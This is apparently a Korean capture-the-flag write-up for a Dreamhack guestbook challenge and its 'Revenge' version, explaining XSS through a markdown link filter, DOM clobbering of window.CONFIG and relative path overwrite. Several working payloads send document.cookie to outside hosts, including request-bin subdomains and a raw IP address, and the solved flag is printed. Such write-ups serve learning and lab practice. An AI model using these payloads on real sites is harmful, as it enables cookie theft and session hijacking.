# Keyword
- XSS
- Dom Clubbering

# Write-Up
- `/GuestBook.php`에서 아래와 같이 형식에 맞게 입력하면 a태그처럼 사용할 수 있게 만들어주는 기능이 있음 
```
<?php
function addLink($content){
  $content = htmlentities($content);
  $content = preg_replace('/\[(.*?)\]\((.*?)\)/', "<a href='$2'>$1</a>", $content);
  return $content;
}
?>
```

- `/Report.php`에서 도메인이 `http://127.0.0.1`인지를 체크를 하고 특정 페이지를 report할 수 있음
- 이를 이용해 `/GuestBook.php`에서 악의적인 게시물을 만들고 그 게시물을 관리자가 읽게 만들어 쿠키를 탈취하는 시나리오를 생각할 수 있음

- 관리자는 헤당 페이지에 접속하고 별다른 동작을 하지 않기 때문에 `autofocus` property를 넣어줘야 페이지 접근시 바로 XSS가 터지게 됨
```
GuestBook.php?content=[](#' name='' autofocus onfocus='location.href=`https://bvzyqfu.request.dreamhack.games/cookie=`+document.cookie'></a>)
```

- 정확한 이유는 모르겠지만 전체 페이로드를 인코딩해야 동작함
```
GuestBook.php?content=%5B%5D%28%23%27%20name%3D%27%27%20autofocus%20onfocus%3D%27location%2Ehref%3D%60https%3A%2F%2Fbvzyqfu%2Erequest%2Edreamhack%2Egames%2Fcookie%3D%60%2Bdocument%2Ecookie%27%3E%3C%2Fa%3E%29%0D%0A
```

# Revenge
- Revenge에서는 XSS를 방지하기 위한 코드가 추가되어서 다른 접근방법을 찾아야 함

- `/GuestBook.php`의 코드를 직접 확인해보면 `<script>`에서 특이한 코드를 찾을 수 있음
```html
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Guest Book</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Guest Book</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="GuestBook.php">Guest Book</a></li>
            <li><a href="Report.php">Report</a></li>
          </ul>
        </div>
      </div>
    </nav><br/><br/><br/>
    <div class="container">
            <br/>
      <form>
      <div class="form-group">
        <label for="content">Content</label>
        <textarea class="form-control" id="content" name="content"></textarea>
      </div>

      <button type="submit" class="btn btn-default">제출</button>
    </form>
    </div>
    <script src="config.js"></script>
    <script>
      if(window.CONFIG && window.CONFIG.debug){
        location.href = window.CONFIG.main;
      }
    </script>
</body>
</html>
```

- 여기서 아래의 코드가 `window.CONFIG` 객체를 수정할 수 있게 된다면 Dom Clubbering를 이용해 원하는 페이지로 이동할 수 있게됨
```html
<script src="config.js"></script>
<script>
  if(window.CONFIG && window.CONFIG.debug){
	location.href = window.CONFIG.main;
  }
</script>
```

- 그러나 아래의 `config.js`를 불러오게 되면서, 객체를 덮어쓰고 변경이 불가능하게 바뀜
```js
window.CONFIG = {
  version: "v0.2",
  main: "/",
  debug: false,
  debugMSG: ""
}

// prevent overwrite
Object.freeze(window.CONFIG);
```

- RPO, HTML Collections과 연계하여 아래의 poc코드를 작성할 수 있음
- `GuestBook.php/` 여기에 있는 `/`가 절대 경로로 인식하게 만듬 
```
GuestBook.php/?content=[a](javascript:document.location="https://xpddjot.request.dreamhack.games/?"%2bdocument.cookie' id='CONFIG' name='main')[a]('id='CONFIG' name='debug')
```

- flag
```
DH{f35a6e5d4109190bdfa3fa59134cff19}
```


---
# 다른 Write-Up
- revenge에서 공백을 '/'로 우회해서 똑같은 페이로드를 사용할 수 있음

- RPO기법을 이용해 애초에 `config.js`가 실행되지 않게 만들 수도 있음
```
http://host1.dreamhack.games:8478/GuestBook.php/
```

```
http://127.0.0.1/GuestBook.php/?content=[test](http://aa.com' id=CONFIG name=debug ') [test](javascript:location.href=`http://3.34.34.150/universe/test.php?${document.cookie}` ' id=CONFIG name=main ')
```